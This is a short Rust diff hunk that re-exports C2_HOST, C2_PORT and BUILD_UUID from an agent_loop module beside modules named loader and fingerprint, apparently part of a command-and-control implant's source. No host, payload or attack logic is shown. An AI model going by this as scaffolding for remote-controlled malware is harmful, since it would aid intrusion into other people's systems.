@@ -12,7 +12,7 @@ mod loader;
 mod fingerprint;
 mod agent_loop;
 
-pub use agent_loop::Session;
+pub use agent_loop::{Session, C2_HOST, C2_PORT, BUILD_UUID};
 
 fn main() {
     agent_loop::run();
